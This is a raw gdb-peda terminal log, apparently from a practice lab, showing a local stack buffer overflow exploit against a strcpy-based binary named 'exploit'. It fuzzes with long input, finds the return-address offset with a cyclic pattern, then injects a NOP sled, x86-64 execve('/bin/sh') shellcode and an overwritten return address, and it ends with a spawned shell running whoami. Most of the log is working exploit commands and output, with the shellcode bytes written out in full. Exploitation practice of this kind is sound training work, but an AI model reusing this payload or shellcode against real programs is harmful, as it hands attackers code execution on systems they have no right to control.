@@ -1,0 +1,291 @@
+jackson@ubuntu:~/Bufferoverflow$ gdb exploit
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from exploit...
+(No debugging symbols found in exploit)
+gdb-peda$ run "Hello World"
+Starting program: /home/jackson/Bufferoverflow/exploit "Hello World"
+[Inferior 1 (process 10746) exited normally]
+Warning: not running
+gdb-peda$ run $(python2 -c 'print "a" * 550')
+Starting program: /home/jackson/Bufferoverflow/exploit $(python2 -c 'print "a" * 550')
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x401180 (<__libc_csu_init>:	endbr64)
+RCX: 0x6161616161616161 ('aaaaaaaa')
+RDX: 0xb ('\x0b')
+RSI: 0x7fffffffe2c0 ('a' <repeats 11 times>)
+RDI: 0x7fffffffdc7b ('a' <repeats 11 times>)
+RBP: 0x6161616161616161 ('aaaaaaaa')
+RSP: 0x7fffffffdc68 ('a' <repeats 30 times>)
+RIP: 0x401178 (<main+66>:	ret)
+R8 : 0x0 
+R9 : 0x61616161616161 ('aaaaaaa')
+R10: 0x40042b --> 0x5f00797063727473 ('strcpy')
+R11: 0x7ffff7f48ba0 (<__strcpy_avx2>:	endbr64)
+R12: 0x401050 (<_start>:	endbr64)
+R13: 0x7fffffffdd50 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40116d <main+55>:	call   0x401040 <strcpy@plt>
+   0x401172 <main+60>:	mov    eax,0x0
+   0x401177 <main+65>:	leave  
+=> 0x401178 <main+66>:	ret    
+   0x401179:	nop    DWORD PTR [rax+0x0]
+   0x401180 <__libc_csu_init>:	endbr64 
+   0x401184 <__libc_csu_init+4>:	push   r15
+   0x401186 <__libc_csu_init+6>:	lea    r15,[rip+0x2c83]        # 0x403e10
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc68 ('a' <repeats 30 times>)
+0008| 0x7fffffffdc70 ('a' <repeats 22 times>)
+0016| 0x7fffffffdc78 ('a' <repeats 14 times>)
+0024| 0x7fffffffdc80 --> 0x616161616161 ('aaaaaa')
+0032| 0x7fffffffdc88 --> 0x401136 (<main>:	endbr64)
+0040| 0x7fffffffdc90 --> 0x401180 (<__libc_csu_init>:	endbr64)
+0048| 0x7fffffffdc98 --> 0x2b8431682f5ec0c4 
+0056| 0x7fffffffdca0 --> 0x401050 (<_start>:	endbr64)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000401178 in main ()
+
+gdb-peda$ pattern_create 550 pat
+Writing pattern of 550 chars to filename "pat"
+gdb-peda$ run $(cat pat)
+Starting program: /home/jackson/Bufferoverflow/exploit $(cat pat)
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x401180 (<__libc_csu_init>:	endbr64)
+RCX: 0x5273416d73415173 ('sQAsmAsR')
+RDX: 0xb ('\x0b')
+RSI: 0x7fffffffe2c0 ("sQAsmAsRAso")
+RDI: 0x7fffffffdc7b ("sQAsmAsRAso")
+RBP: 0x4e73413873416973 ('siAs8AsN')
+RSP: 0x7fffffffdc68 ("AsjAs9AsOAskAsPAslAsQAsmAsRAso")
+RIP: 0x401178 (<main+66>:	ret)
+R8 : 0x0 
+R9 : 0x6f73415273416d ('mAsRAso')
+R10: 0x40042b --> 0x5f00797063727473 ('strcpy')
+R11: 0x7ffff7f48ba0 (<__strcpy_avx2>:	endbr64)
+R12: 0x401050 (<_start>:	endbr64)
+R13: 0x7fffffffdd50 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40116d <main+55>:	call   0x401040 <strcpy@plt>
+   0x401172 <main+60>:	mov    eax,0x0
+   0x401177 <main+65>:	leave  
+=> 0x401178 <main+66>:	ret    
+   0x401179:	nop    DWORD PTR [rax+0x0]
+   0x401180 <__libc_csu_init>:	endbr64 
+   0x401184 <__libc_csu_init+4>:	push   r15
+   0x401186 <__libc_csu_init+6>:	lea    r15,[rip+0x2c83]        # 0x403e10
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc68 ("AsjAs9AsOAskAsPAslAsQAsmAsRAso")
+0008| 0x7fffffffdc70 ("OAskAsPAslAsQAsmAsRAso")
+0016| 0x7fffffffdc78 ("slAsQAsmAsRAso")
+0024| 0x7fffffffdc80 --> 0x6f7341527341 ('AsRAso')
+0032| 0x7fffffffdc88 --> 0x401136 (<main>:	endbr64)
+0040| 0x7fffffffdc90 --> 0x401180 (<__libc_csu_init>:	endbr64)
+0048| 0x7fffffffdc98 --> 0x7bbf5b6d61bde568 
+0056| 0x7fffffffdca0 --> 0x401050 (<_start>:	endbr64)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000401178 in main ()
+
+gdb-peda$ pattern_search pat
+Registers contain pattern buffer:
+RCX+0 found at offset: 539
+RBP+0 found at offset: 512
+R9+0 found at offset: 543
+Registers point to pattern buffer:
+[RSI] --> offset 539 - size ~11
+[RDI] --> offset 539 - size ~11
+[RSP] --> offset 520 - size ~30
+Pattern buffer found at:
+0x00007fffffffd735 : offset    0 - size   11 ($sp + -0x533 [-333 dwords])
+0x00007fffffffda60 : offset    0 - size  550 ($sp + -0x208 [-130 dwords])
+0x00007fffffffe0a5 : offset    0 - size  550 ($sp + 0x43d [271 dwords])
+References to pattern buffer found at:
+0x00007fffffffd640 : 0x00007fffffffda60 ($sp + -0x628 [-394 dwords])
+0x00007fffffffd660 : 0x00007fffffffda60 ($sp + -0x608 [-386 dwords])
+0x00007fffffffd650 : 0x00007fffffffe0a5 ($sp + -0x618 [-390 dwords])
+0x00007fffffffd658 : 0x00007fffffffe0a5 ($sp + -0x610 [-388 dwords])
+0x00007fffffffdd60 : 0x00007fffffffe0a5 ($sp + 0xf8 [62 dwords])
+
+gdb-peda$ run $(python2 -c 'print "\x90" * 450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41" * 43 + "b" * 6')
+Starting program: /home/jackson/Bufferoverflow/exploit $(python2 -c 'print "\x90" * 450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41" * 43 + "b" * 6')
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x401180 (<__libc_csu_init>:	endbr64)
+RCX: 0x6262624141414141 ('AAAAAbbb')
+RDX: 0xb ('\x0b')
+RSI: 0x7fffffffe2c0 ("AAAAAbbbbbb")
+RDI: 0x7fffffffdc73 ("AAAAAbbbbbb")
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7fffffffdc80 --> 0x7ffff7ffc620 --> 0x5048000000000 
+RIP: 0x626262626262 ('bbbbbb')
+R8 : 0x0 
+R9 : 0x62626262626241 ('Abbbbbb')
+R10: 0x40042b --> 0x5f00797063727473 ('strcpy')
+R11: 0x7ffff7f48ba0 (<__strcpy_avx2>:	endbr64)
+R12: 0x401050 (<_start>:	endbr64)
+R13: 0x7fffffffdd60 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x626262626262
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc80 --> 0x7ffff7ffc620 --> 0x5048000000000 
+0008| 0x7fffffffdc88 --> 0x7fffffffdd68 --> 0x7fffffffe098 ("/home/jackson/Bufferoverflow/exploit")
+0016| 0x7fffffffdc90 --> 0x200000000 
+0024| 0x7fffffffdc98 --> 0x401136 (<main>:	endbr64)
+0032| 0x7fffffffdca0 --> 0x401180 (<__libc_csu_init>:	endbr64)
+0040| 0x7fffffffdca8 --> 0xcbad11154c2cb560 
+0048| 0x7fffffffdcb0 --> 0x401050 (<_start>:	endbr64)
+0056| 0x7fffffffdcb8 --> 0x7fffffffdd60 --> 0x2 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000626262626262 in ?? ()
+
+gdb-peda$ x/200x $rsp
+0x7fffffffdc80:	0x00007ffff7ffc620	0x00007fffffffdd68
+0x7fffffffdc90:	0x0000000200000000	0x0000000000401136
+0x7fffffffdca0:	0x0000000000401180	0xcbad11154c2cb560
+0x7fffffffdcb0:	0x0000000000401050	0x00007fffffffdd60
+0x7fffffffdcc0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcd0:	0x3452eeeaf52cb560	0x3452fea92ce2b560
+0x7fffffffdce0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcf0:	0x0000000000000000	0x0000000000000002
+0x7fffffffdd00:	0x00007fffffffdd68	0x00007fffffffdd80
+0x7fffffffdd10:	0x00007ffff7ffe190	0x0000000000000000
+0x7fffffffdd20:	0x0000000000000000	0x0000000000401050
+0x7fffffffdd30:	0x00007fffffffdd60	0x0000000000000000
+0x7fffffffdd40:	0x0000000000000000	0x000000000040107e
+0x7fffffffdd50:	0x00007fffffffdd58	0x000000000000001c
+0x7fffffffdd60:	0x0000000000000002	0x00007fffffffe098
+0x7fffffffdd70:	0x00007fffffffe0bd	0x0000000000000000
+0x7fffffffdd80:	0x00007fffffffe2cc	0x00007fffffffe2dc
+0x7fffffffdd90:	0x00007fffffffe32e	0x00007fffffffe341
+0x7fffffffdda0:	0x00007fffffffe355	0x00007fffffffe382
+0x7fffffffddb0:	0x00007fffffffe399	0x00007fffffffe3c5
+0x7fffffffddc0:	0x00007fffffffe3d7	0x00007fffffffe3f7
+0x7fffffffddd0:	0x00007fffffffe420	0x00007fffffffe434
+0x7fffffffdde0:	0x00007fffffffe44b	0x00007fffffffe45e
+0x7fffffffddf0:	0x00007fffffffe46f	0x00007fffffffe48b
+0x7fffffffde00:	0x00007fffffffe4a9	0x00007fffffffe4ca
+0x7fffffffde10:	0x00007fffffffe4e5	0x00007fffffffe4f5
+0x7fffffffde20:	0x00007fffffffe50a	0x00007fffffffe53e
+0x7fffffffde30:	0x00007fffffffe54d	0x00007fffffffe56a
+0x7fffffffde40:	0x00007fffffffe593	0x00007fffffffe5a0
+0x7fffffffde50:	0x00007fffffffe5a9	0x00007fffffffe5bc
+0x7fffffffde60:	0x00007fffffffe5cd	0x00007fffffffe5df
+0x7fffffffde70:	0x00007fffffffe5ea	0x00007fffffffebcc
+0x7fffffffde80:	0x00007fffffffebed	0x00007fffffffebf9
+0x7fffffffde90:	0x00007fffffffec0a	0x00007fffffffec60
+0x7fffffffdea0:	0x00007fffffffec8f	0x00007fffffffec9f
+0x7fffffffdeb0:	0x00007fffffffecc1	0x00007fffffffecd8
+0x7fffffffdec0:	0x00007fffffffecec	0x00007fffffffed0c
+0x7fffffffded0:	0x00007fffffffed19	0x00007fffffffed37
+0x7fffffffdee0:	0x00007fffffffed42	0x00007fffffffed4a
+0x7fffffffdef0:	0x00007fffffffed5c	0x00007fffffffedb4
+0x7fffffffdf00:	0x00007fffffffede0	0x00007fffffffedff
+0x7fffffffdf10:	0x00007fffffffee16	0x00007fffffffee6b
+0x7fffffffdf20:	0x00007fffffffef65	0x00007fffffffef77
+0x7fffffffdf30:	0x0000000000000000	0x0000000000000021
+0x7fffffffdf40:	0x00007ffff7fce000	0x0000000000000010
+0x7fffffffdf50:	0x00000000bfebfbff	0x0000000000000006
+0x7fffffffdf60:	0x0000000000001000	0x0000000000000011
+0x7fffffffdf70:	0x0000000000000064	0x0000000000000003
+0x7fffffffdf80:	0x0000000000400040	0x0000000000000004
+0x7fffffffdf90:	0x0000000000000038	0x0000000000000005
+0x7fffffffdfa0:	0x000000000000000d	0x0000000000000007
+0x7fffffffdfb0:	0x00007ffff7fcf000	0x0000000000000008
+0x7fffffffdfc0:	0x0000000000000000	0x0000000000000009
+0x7fffffffdfd0:	0x0000000000401050	0x000000000000000b
+0x7fffffffdfe0:	0x00000000000003e8	0x000000000000000c
+0x7fffffffdff0:	0x00000000000003e8	0x000000000000000d
+0x7fffffffe000:	0x00000000000003e8	0x000000000000000e
+0x7fffffffe010:	0x00000000000003e8	0x0000000000000017
+0x7fffffffe020:	0x0000000000000000	0x0000000000000019
+0x7fffffffe030:	0x00007fffffffe079	0x000000000000001a
+0x7fffffffe040:	0x0000000000000000	0x000000000000001f
+0x7fffffffe050:	0x00007fffffffefd3	0x000000000000000f
+0x7fffffffe060:	0x00007fffffffe089	0x0000000000000000
+0x7fffffffe070:	0x0000000000000000	0xd522e448e44f2700
+0x7fffffffe080:	0xb065d6888aa616c2	0x0034365f3638785a
+0x7fffffffe090:	0x0000000000000000	0x616a2f656d6f682f
+0x7fffffffe0a0:	0x75422f6e6f736b63	0x7265766f72656666
+0x7fffffffe0b0:	0x7078652f776f6c66	0x9090900074696f6c
+0x7fffffffe0c0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe0d0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe0e0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe0f0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe100:	0x9090909090909090	0x9090909090909090
+0x7fffffffe110:	0x9090909090909090	0x9090909090909090
+0x7fffffffe120:	0x9090909090909090	0x9090909090909090
+0x7fffffffe130:	0x9090909090909090	0x9090909090909090
+0x7fffffffe140:	0x9090909090909090	0x9090909090909090
+0x7fffffffe150:	0x9090909090909090	0x9090909090909090
+0x7fffffffe160:	0x9090909090909090	0x9090909090909090
+0x7fffffffe170:	0x9090909090909090	0x9090909090909090
+0x7fffffffe180:	0x9090909090909090	0x9090909090909090
+0x7fffffffe190:	0x9090909090909090	0x9090909090909090
+0x7fffffffe1a0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe1b0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe1c0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe1d0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe1e0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe1f0:	0x9090909090909090	0x9090909090909090
+0x7fffffffe200:	0x9090909090909090	0x9090909090909090
+0x7fffffffe210:	0x9090909090909090	0x9090909090909090
+0x7fffffffe220:	0x9090909090909090	0x9090909090909090
+0x7fffffffe230:	0x9090909090909090	0x9090909090909090
+0x7fffffffe240:	0x9090909090909090	0x9090909090909090
+0x7fffffffe250:	0x9090909090909090	0x9090909090909090
+0x7fffffffe260:	0x9090909090909090	0x9090909090909090
+0x7fffffffe270:	0x9090909090909090	0x3190909090909090
+0x7fffffffe280:	0xd091969dd1bb48c0	0x5453dbf748ff978c
+0x7fffffffe290:	0x3bb05e545752995f	0x414141414141050f
+0x7fffffffe2a0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe2b0:	0x4141414141414141	0x4141414141414141
+
+gdb-peda$ run $(python2 -c 'print "\x90" * 450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41" * 43 + "\x30\xe1\xff\xff\xff\x7f"')
+Starting program: /home/jackson/Bufferoverflow/exploit $(python2 -c 'print "\x90" * 450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41" * 43 + "\x30\xe1\xff\xff\xff\x7f"')
+process 10850 is executing new program: /bin/dash
+$ whoami
+[Attaching after process 10850 fork to child process 10852]
+[New inferior 2 (process 10852)]
+[Detaching after fork from parent process 10850]
+[Inferior 1 (process 10850) detached]
+process 10852 is executing new program: /usr/bin/whoami
+jackson
+$ [Inferior 2 (process 10852) exited normally]
+Warning: not running
+
+[2]+  Stopped                 gdb exploit
